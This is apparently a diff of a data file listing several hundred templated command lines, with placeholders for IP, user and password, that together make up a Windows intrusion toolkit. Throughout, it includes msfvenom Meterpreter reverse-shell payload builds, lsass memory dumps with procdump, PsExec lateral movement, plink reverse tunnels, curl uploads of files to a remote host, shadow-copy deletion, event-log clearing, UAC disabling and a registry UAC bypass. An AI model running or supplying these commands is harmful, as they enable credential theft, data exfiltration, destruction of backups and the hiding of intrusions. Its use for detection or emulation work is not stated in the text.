-Psexec64.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}
-cmd /c "plink -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
-psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
-powershell -c "del /f ${local_file_path}"
-cmd /c "msfvenom -p windows/meterpreter/reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-powershell -c "mstsc.exe /v:${ip_address} /f /public"
-echo ${email_content} | sendmail ${username}@${domain} 2> /dev/null
-msfvenom -p windows/meterpreter/reverse_https_proxy LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-powershell -c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ"
-cmd /c "msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-nmap -p- -sC -sV -O ${ip_address} 2> /dev/null
-cmd /c "certutil -encode -gmt -v error.txt encode.txt"
-powershell -c "procdump.exe -accepteula -mm lsass lsassdump.dmp"
-psexec.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d
-msfvenom -p windows/meterpreter_reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-cmd /c "choco install Megasync"
-powershell -c "sdelete -f -q ${local_file_path}"
-cmd /c "taskkill /f /im ${process_name}"
-certutil -encode -UnicodeText error.txt encode.txt
-powershell -c "choco install 7zip"
-powershell -c "7z a -slt -p${password} ${destination_file_path} ${source_file_path}"
-powershell -c "mstsc.exe /v:${ip_address} /f /restrictedAdmin"
-curl.exe -X POST http://${ip_address}/upload -F "files=@${source_file_path}"
-nmap -sP ${ip_address} 2> error.log
-powershell -c "msfvenom -p windows/meterpreter/reverse_tcp_rc4_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-7z.exe a -p ${destination_file_path} ${source_file_path}
-del ${local_file_path}
-powershell -c "del ${local_file_path}"
-cmd /c "wmic.exe os get Caption,Version"
-powershell -c "taskkill /F /im ${process_name} /T"
-curl.exe -v -X POST http://${ip_address}/upload -H -F files=@${source_file_path}
-choco install putty
-rmdir /s ${local_file_path}
-powershell -c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
-powershell -c "rmdir /s /q ${local_file_path}"
-cmd /c "plink.exe -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
-cat email.txt | ssmtp ${username}@${domain}
-powershell -c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d"
-Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
-powershell -c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f"
-cmd /c "msfvenom -p windows/meterpreter/reverse_winhttps LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-cmd /c "hostname.exe"
-7z a -p${password} ${destination_file_path} ${source_file_path}
-reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f
-psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
-vssadmin Delete Shadows /all
-procdump.exe -ma lsass.exe lsassdump.dmp
-ipconfig.exe /renew
-cmd /c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f"
-powershell -c "mstsc.exe /v:${ip_address} /f"
-choco install 7zip
-powershell -c "wevtutil.exe cl system"
-cmd /c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
-powershell -c "taskkill.exe /f /im ${process_name}"
-powershell -c "sdelete.exe -s -q ${local_file_path}"
-mstsc.exe /v:${ip_address} /f /public
-mail -s ${email_subject} ${username}@${domain} < mail.txt
-vssadmin.exe create shadow /for=C:
-nmap -v -A ${ip_address}
-wmic.exe os get Version
-psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d
-7z.exe a -slp ${destination_file_path} ${source_file_path} -p
-powershell -c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}"
-powershell -c "psexec.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d"
-vssadmin.exe delete shadows /all
-nmap -v ${ip_address} 2> /dev/null
-powershell -c "vssadmin Delete Shadows /All /quiet"
-powershell -c "wmic.exe os get Name"
-powershell -c "del /f /p ${local_file_path}"
-del /q ${local_file_path}
-cmd /c "msfvenom -p windows/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-powershell -c "sdelete -s -q ${local_file_path}"
-powershell -c "curl.exe -X POST http://${ip_address}/upload -H -F files=@${source_file_path}"
-7z a ${destination_file_path} ${source_file_path} -p
-reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f
-cmd /c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s"
-cmd /c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d"
-powershell -c "certutil -encode -Unicode -v -f error.txt encode.txt"
-arp -g
-cmd /c "7z a -slt -p${password} ${destination_file_path} ${source_file_path}"
-sdelete.exe -q -accepteula ${local_file_path}
-powershell -c "procdump.exe -accepteula -mm lsass.exe lsassdump.dmp"
-taskkill.exe /F /IM ${process_name}
-cmd /c "curl.exe -X POST http://${ip_address}/upload -F files=@${source_file_path}"
-echo ${email_content} | mpack -s ${email_subject} ${username}@${domain}
-powershell -c "reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
-cmd /c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d -s"
-powershell -c "plink -ssh -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-plink.exe -ssh ${username}@${ip_address} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
-cmd /c "sdelete.exe ${local_file_path}"
-powershell -c "certutil -encode -Unicode error.txt encode.txt"
-powershell -c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}"
-powershell -c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d"
-nmap -p- -sC -sV -O -A ${ip_address} 2> &1
-certutil -encode -Unicode -gmt -v -f error.txt encode.txt
-powershell -c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
-cmd /c "psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
-mstsc.exe /v:${ip_address} /multimon
-sdelete -s -q ${local_file_path}
-psexec \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}
-reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f
-powershell -c "plink.exe -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
-cmd /c "sdelete -f -q ${loal_file_path}"
-msfvenom -p windows/meterpreter/reverse_winhttp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-nmap -F ${ip_address} 2> &1
-powershell -c "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-sdelete.exe -s -q ${local_file_path}
-cmd /c "plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}"
-sendmail ${username}@${domain} < mail.txt 2> error.log
-cmd /c "netstat.exe -q"
-powershell -c "sdelete.exe ${local_file_path}"
-powershell -c "msfvenom -p windows/meterpreter_reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-msfvenom -p windows/x64/meterpreter/reverse_winhttp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d -s
-powershell -c "curl.exe -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
-cmd /c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
-cmd /c "choco install -y rclone"
-cmd /c "choco install -f putty"
-powershell -c "ipconfig /all"
-systeminfo
-cmd /c "sdelete.exe -f -accepteula ${local_file_path}"
-cmd /c "choco install ngrok"
-cmd /c "7z.exe a ${destination_file_path} ${source_file_path} -p${password}"
-msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-nmap -sV ${ip_address} 2> &1
-Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
-powershell -c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f"
-powershell -c "psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
-netstat -q
-cat email.txt | mutt -s ${email_subject} ${username}@${domain} 2> error.log
-nmap -F ${ip_address}
-cmd /c "vssadmin Delete Shadows /all /quiet"
-Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}
-cmd /c "curl -X POST http://${ip_address}/upload -H -F files=@${source_file_path}"
-cmd /c "vssadmin delete shadows /All /quiet"
-mstsc /v:${ip_address} /f
-nmap -A ${ip_address} 2> error.log
-powershell -c "certutil -encode -v -f error.txt encode.txt"
-procdump -accepteula -mm lsass.exe lsassdump.dmp
-powershell -c "mstsc.exe /v:${ip_address} /f /remoteGuard"
-ipconfig.exe
-certutil -encode -Unicode -v error.txt encode.txt
-del /p /q ${local_file_path}
-cmd /c "rmdir /s /q ${local_file_path}"
-powershell -c "certutil -encode -UnicodeText -v -f error.txt encode.txt"
-vssadmin Delete Shadows /All /quiet
-powershell -c "choco install -f rclone"
-powershell -c "certutil -encode -Unicode -gmt -f error.txt encode.txt"
-cmd /c "curl -X POST -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
-sc.exe stop ${service_name}
-cmd /c "sdelete ${local_file_path}"
-echo ${email_content} | mutt -s ${email_subject} ${username}@${domain}
-powershell -c "procdump.exe -mm lsass lsassdump.dmp"
-powershell -c "msfvenom -p windows/meterpreter_reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-cmd /c "msfvenom -p windows/meterpreter/reverse_winhttp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-msfvenom -p windows/meterpreter/reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-ipconfig /allcompartments
-psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}
-cmd /c "taskkill /F /im ${process_name} /T"
-plink -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
-7z.exe a -slt -p ${destination_file_path} ${source_file_path}
-powershell -c "plink.exe -ssh ${username}@${ip_address} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-powershell -c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}"
-powershell -c "sdelete.exe -s -q -accepteula ${local_file_path}"
-nmap --open ${ip_address} 2> &1
-msfvenom -p windows/x64/meterpreter_reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-nmap -p- ${ip_address} 2> /dev/null
-powershell -c "choco install -y 7zip"
-echo ${email_content} | mutt -s ${email_subject} ${username}@${domain} -a attachement.txt 2> error.log
-sdelete.exe -s -q -accepteula ${local_file_path}
-certutil -encode -gmt -f ${source_file_path} ${destination_file_path}
-cmd /c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}"
-cmd /c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
-cmd /c "certutil -encode -Unicode -v error.txt encode.txt"
-procdump -accepteula -mm lsass lsassdump.dmp
-plink.exe -ssh -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
-plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}
-cmd /c "taskkill /F /IM ${process_name}"
-cmd /c "curl -X POST -H -F file=@${source_file_path} http://${ip_address}:${port}/upload"
-cmd /c "certutil -encode -UnicodeText -v error.txt encode.txt"
-cmd /c "wmic.exe os get CSName"
-arp.exe -g
-rmdir /q /s ${local_file_path}
-7z a -slp -p ${destination_file_path} ${source_file_path}
-vssadmin Delete Shadows /all /quiet
-powershell -c "netstat.exe -f"
-sdelete.exe -s ${local_file_path}
-sendmail ${username}@${domain} < mail.txt 2> /dev/null
-choco install -f procdump
-cmd /c "curl -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
-cmd /c "choco install -y putty"
-rm -f ${local_file_path}
-procdump -accepteula -ma lsass lsassdump.dmp
-choco install -f putty
-powershell -c "curl.exe -X POST http://${ip_address}/upload -F 'files=@${source_file_path}'"
-powershell -c "psexec.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
-cmd /c "curl -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
-cmd /c "msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-cmd /c "del ${local_file_path}"
-cmd /c "netstat -q"
-cmd /c "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-echo ${email_content} | mutt -s ${email_subject} ${username}@${domain} -a attachement.txt 2> &1
-rm -f ${local_file_path} 2> error.log
-cmd /c "procdump -ma lsass.exe lsassdump.dmp"
-cmd /c "mstsc.exe /v:${ip_address} /admin"
-cmd /c "sdelete -s -q ${loal_file_path}"
-cmd /c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
-cmd /c "netstat.exe -a"
-rm -rf ${local_file_path}
-cmd /c "net stop ${service_name}"
-powershell -c "plink -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-powershell -c "netstat -a"
-powershell -c "choco install procdump"
-procdump -ma lsass.exe lsassdump.dmp
-powershell -c "sdelete -q ${local_file_path}"
-cmd /c "psexec \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}"
-cat email.txt | mpack -s ${email_subject} ${username}@${domain} 2> error.log
-cmd /c "msfvenom -p windows/meterpreter_reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-cmd /c "wevtutil cl security"
-net stop ${service_name}
-cmd /c "hostname"
-cat email.txt | sendmail ${username}@${domain} 2> /dev/null
-reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ
-cmd /c "Psexec64 \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}"
-powershell -c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f"
-cmd /c "del /p ${local_file_path}"
-powershell -c "procdump -accepteula -mm lsass.exe lsassdump.dmp"
-cmd /c "7z.exe a -slp -p ${destination_file_path} ${source_file_path}"
-plink -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
-cmd /c "ipconfig /all"
-7z a -slt ${destination_file_path} ${source_file_path} -p
-reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f
-powershell -c "procdump.exe -accepteula -ma lsass.exe lsassdump.dmp"
-powershell -c "plink -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
-7z a -slp ${destination_file_path} ${source_file_path} -p
-cmd /c "choco install -y procdump"
-powershell -c "7z a -slt -p ${destination_file_path} ${source_file_path}"
-cmd /c "choco install -y Megasync"
-wmic os get Name
-powershell -c "plink.exe -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-powershell -c "plink -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
-rm -f ${local_file_path} 2> &1
-powershell -c "psexec \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}"
-cmd /c "choco install -f rclone"
-cmd /c "arp -a"
-choco install winscp
-cmd /c "ipconfig"
-powershell -c "msfvenom -p windows/meterpreter/reverse_winhttp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-certutil -encode -Unicode -gmt -v error.txt encode.txt
-powershell -c "choco install -f 7zip"
-cat email.txt | mpack -s ${email_subject} ${username}@${domain}
-cmd /c "reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
-choco install -y Megasync
-powershell -c "msfvenom -p windows/meterpreter/reverse_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-cmd /c "plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
-powershell -c "plink.exe -ssh ${username}@${ip_address} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-sdelete.exe -f ${local_file_path}
-wmic.exe os get CSName
-Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d
-powershell -c "reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD_LITTLE_ENDIAN /d 0 /f"
-taskkill /F /IM ${process_name}
-powershell -c "wevtutil clear-log application"
-psexec.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}
-powershell -c "7z.exe a -p ${destination_file_path} ${source_file_path}"
-cmd /c "7z.exe a -slp ${destination_file_path} ${source_file_path} -p${password}"
-powershell -c "procdump.exe -mm lsass.exe lsassdump.dmp"
-rm -fr ${local_file_path}
-powershell -c "sdelete.exe -f -accepteula ${local_file_path}"
-cmd /c "vssadmin.exe delete shadows /all /quiet"
-powershell -c "psexec.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}"
-net.exe stop ${service_name}
-cmd /c "sdelete -q -accepteula ${loal_file_path}"
-choco install Megasync
-powershell -c "Psexec64 \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}"
-tasklist
-ipconfig
-sdelete ${local_file_path}
-powershell -c "7z.exe a ${destination_file_path} ${source_file_path} -p"
-cmd /c "sdelete -accepteula ${local_file_path}"
-reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ
-powershell -c "vssadmin delete shadows /All /Quiet"
-powershell -c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
-powershell -c "netstat.exe"
-cmd /c "psexec.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
-procdump.exe -accepteula -ma lsass lsassdump.dmp
-cmd /c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d"
-powershell -c "certutil -encode -Unicode -gmt -v -f error.txt encode.txt"
-powershell -c "certutil -encode -gmt -f ${source_file_path} ${destination_file_path}"
-curl -X POST -H -F file=@${source_file_path} http://${ip_address}:${port}/upload
-nmap -T5 ${ip_address} 2> /dev/null
-mstsc.exe /v:${ip_address} /admin
-reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
-netstat.exe -q
-powershell -c "del /p /q ${local_file_path}"
-powershell -c "del /p ${local_file_path}"
-curl -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload
-vssadmin delete shadows /all /quiet
-cmd /c "psexec \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d"
-powershell -c "vssadmin create shadow /for=C:"
-nmap -p- -sC -sV ${ip_address}
-cmd /c "reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
-7z a ${destination_file_path} ${source_file_path} -p${password}
-powershell -c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d"
-cmd /c "choco install -y ngrok"
-mstsc.exe /v:${ip_address} /public
-powershell -c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
-powershell -c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f"
-cmd /c "mstsc /v:${ip_address} /admin"
-nmap -T5 ${ip_address} 2> error.log
+cmd /c "curl -X POST -F "file=@${source_file_path}" http://${ip_address}:${port}/upload"
 cmd /c "taskkill /F /im ${process_name}"
-cmd /c "7z a -slp -p${password} ${destination_file_path} ${source_file_path}"
-cmd /c "7z a -slp ${destination_file_path} ${source_file_path} -p"
-plink -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}
-powershell -c "msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-msfvenom -p windows/meterpreter/reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-cmd /c "taskkill /im ${process_name} /T"
-cmd /c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}"
-cmd /c "wmic os get SystemDevice"
-powershell -c "wevtutil cl system"
-powershell -c "taskkill.exe /im ${process_name}"
-7z.exe a -slt ${destination_file_path} ${source_file_path} -p
-cmd /c "7z.exe a -p ${destination_file_path} ${source_file_path}"
-reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD_LITTLE_ENDIAN /d 0 /f
-rm -r ${local_file_path} 2> error.log
-powershell -c "wevtutil clear-log system"
-cmd /c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d"
-cat email.txt | mutt -s ${email_subject} ${username}@${domain} 2> &1
-certutil -encode -gmt -v error.txt encode.txt
-cmd /c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f"
-powershell -c "curl.exe -X POST -H -F file=@${source_file_path} http://${ip_address}:${port}/upload"
-powershell -c "sdelete -s ${local_file_path}"
-netstat.exe
-cmd /c "taskkill.exe /F /im ${process_name} /T"
-powershell -c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}"
-certutil -encode -UnicodeText -f error.txt encode.txt
-reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}
-arp -a
-cmd /c "taskkill.exe /im ${process_name}"
-powershell -c "tasklist"
-echo ${email_content} | mpack -s ${email_subject} ${username}@${domain} 2> /dev/null
-powershell -c "7z.exe a -slt ${destination_file_path} ${source_file_path} -p"
-reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ
-cat email.txt | mpack -s ${email_subject} ${username}@${domain} 2> /dev/null
-powershell -c "curl.exe -X POST http://${ip_address}/upload -H -F 'files=@${source_file_path}'"
-certutil -encode -Unicode error.txt encode.txt
-powershell -c "wmic os get Name"
-powershell -c "7z a -p ${destination_file_path} ${source_file_path}"
-echo -e ${email_content} | ssmtp ${username}@${domain} 2> &1
-powershell -c "psexec.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d"
-cmd /c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ
-cmd /c "certutil -encode -gmt -f ${source_file_path} ${destination_file_path}"
-powershell -c "ipconfig"
-cmd /c "mstsc /v:${ip_address} /multimon"
-powershell -c "vssadmin.exe Delete Shadows /All /quiet"
-powershell -c "taskkill /f /im ${process_name}"
-sdelete -q -accepteula ${local_file_path}
-plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}
-cmd /c "reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f"
-certutil -encode -gmt -v -f error.txt encode.txt
-cmd /c "arp.exe -g"
-cmd /c "taskkill.exe /im ${process_name} /T"
-cmd /c "certutil -encode -Unicode -v -f error.txt encode.txt"
-taskkill /im ${process_name} /T
-powershell -c "7z.exe a -slp -p${password} ${destination_file_path} ${source_file_path}"
-cmd /c "certutil -encode -UnicodeText -v -f error.txt encode.txt"
-powershell -c "curl -X POST -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
-Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d
-mail -s ${email_subject} ${username}@${domain} < mail.txt 2> /dev/null
-cmd /c "wevtutil.exe cl system"
-choco install -y putty
-powershell -c "msfvenom -p windows/meterpreter/reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-cmd /c "sdelete -f ${local_file_path}"
-cmd /c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}"
-plink -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}
-powershell -c "choco install psexec"
-cmd /c "sdelete.exe -s -q ${local_file_path}"
-wevtutil.exe cl system
-powershell -c "wmic os get TotalVirtualMemorySize"
-reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ
-cmd /c "wevtutil clear-log security"
-powershell -c "mstsc.exe /v:${ip_address} /restrictedAdmin"
-powershell -c "wmic os get Caption"
-curl.exe -X POST http://${ip_address}/upload -F files=@${source_file_path}
-psexec \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
-cmd /c "vssadmin Delete Shadows /all"
-cmd /c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f"
-powershell -c "Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}"
-cmd /c "7z a -p ${destination_file_path} ${source_file_path}"
-cmd /c "choco install psexec"
-echo ${email_content} | sendmail ${username}@${domain} 2> &1
-cmd /c "7z.exe a -slp -p${password} ${destination_file_path} ${source_file_path}"
-cmd /c "vssadmin.exe delete shadows /all /Quiet"
-echo ${email_content} | mutt -s ${email_subject} ${username}@${domain} 2> error.log
-choco install -y 7zip
-cmd /c "sdelete.exe -q -accepteula ${local_file_path}"
-cmd /c "systeminfo.exe"
-certutil -encode -f ${source_file_path} ${destination_file_path}
-powershell -c "plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}"
-cmd /c "wevtutil.exe cl security"
-powershell -c "psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s"
-cmd /c "7z.exe a -slt ${destination_file_path} ${source_file_path} -p"
-cmd /c "arp.exe -a"
-nmap -sV ${ip_address} 2> error.log
-cmd /c "choco install -f 7zip"
-psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d
-cmd /c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
-cmd /c "curl -X POST http://${ip_address}/upload -F 'files=@${source_file_path}'"
-powershell -c "systeminfo"
-powershell -c "mstsc /v:${ip_address} /f /remoteGuard"
-cmd /c "curl -X POST -H -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
-mailx -s ${email_subject} ${username}@${domain} < mail.txt 2> &1
-cmd /c "certutil -encode -UnicodeText -gmt -f error.txt encode.txt"
-powershell -c "wmic.exe os get Version"
-powershell -c "wevtutil.exe cl application"
-cmd /c "mstsc /v:${ip_address} /f /public"
-cmd /c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ"
-cmd /c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}"
-nmap --open ${ip_address}
-powershell -c "plink -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}"
-psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d -s
-powershell -c "mstsc.exe /v:${ip_address}"
-psexec \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}
-cmd /c "plink.exe -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-powershell -c "mstsc /v:${ip_address} /f"
-vssadmin.exe delete shadows /all /quiet
-mailx -s ${email_subject} ${username}@${domain} < mail.txt
-systeminfo.exe
-powershell -c "psexec \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d"
-powershell -c "7z.exe a ${destination_file_path} ${source_file_path} -p${password}"
-powershell -c "7z.exe a -slp ${destination_file_path} ${source_file_path} -p"
-cmd /c "mstsc.exe /v:${ip_address} /f"
+del /q ${local_file_path}
+cmd /c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d -s"
 powershell -c "choco install -y putty"
-powershell -c "procdump.exe -ma lsass lsassdump.dmp"
-reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f
-psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s
-plink.exe -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}
-echo ${email_content} | mpack -s ${email_subject} ${username}@${domain} -a attachement.txt 2> /dev/null
